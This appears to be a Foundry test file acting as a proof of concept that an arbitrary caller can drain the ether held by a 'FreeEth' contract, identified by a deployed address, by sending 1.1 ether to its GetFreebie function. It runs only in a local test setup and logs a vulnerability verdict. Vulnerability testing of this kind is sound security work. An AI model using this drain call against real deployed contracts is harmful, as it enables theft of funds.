// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol";

contract FreeEthTest is Test {
    FreeEth internal freeEth;
    address internal owner = address(0xBEEF); // Dedicated EOA owner 
    address internal attacker = address(0xABCD);
    
    function setUp() public {
        // Deploy contract by the dedicated EOA owner
        vm.prank(owner);
        freeEth = new FreeEth();
        
        // Fund contract with Ether separately
        vm.deal(address(freeEth), 10 ether);
    }
    
    function test_ArbitraryUserCanDrainFunds() public {
        // Ensure contract initially has 10 Ether
        assertEq(address(freeEth).balance, 10 ether, "Initial contract balance");
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(freeEth).balance;
        uint256 totalWithdrawalsBefore = freeEth.totalWithdrawals();
        uint256 claimsBefore = freeEth.freebieClaims(attacker);
        uint256 totalFreebiesBefore = freeEth.totalFreebies();
        console.log("Contract Balance (Before): %s", contractBalanceBefore);
        console.log("Total Withdrawals (Before): %s", totalWithdrawalsBefore);
        console.log("Attacker Claim Status (Before): %s", claimsBefore);
        console.log("Total Freebies Distributed (Before): %s", totalFreebiesBefore);
        
        console.log("--- Trigger Attack ---");
        // Fund attacker and make the call
        vm.deal(attacker, 1.1 ether);
        vm.prank(attacker);
        freeEth.GetFreebie{value: 1.1 ether}();
        
        console.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(freeEth).balance;
        uint256 totalWithdrawalsAfter = freeEth.totalWithdrawals();
        uint256 claimsAfter = freeEth.freebieClaims(attacker);
        uint256 totalFreebiesAfter = freeEth.totalFreebies();
        console.log("Contract Balance (After): %s", contractBalanceAfter);
        console.log("Total Withdrawals (After): %s", totalWithdrawalsAfter);
        console.log("Attacker Claim Status (After): %s", claimsAfter);
        console.log("Total Freebies Distributed (After): %s", totalFreebiesAfter);
        
        // Verify state changes
        bool contractDrained = (contractBalanceAfter == 0);
        bool claimStatusUpdated = (claimsAfter == claimsBefore + 1);
        bool freebiesIncreased = (totalFreebiesAfter == totalFreebiesBefore + 1);
        
        // Final vulnerability verdict
        if (contractDrained) {
            console.log("Vulnerability Exists: Attacker successfully drained contract balance");
        } else {
            console.log("Vulnerability not Exist: Contract balance remains (%s)", contractBalanceAfter);
        }
    }
}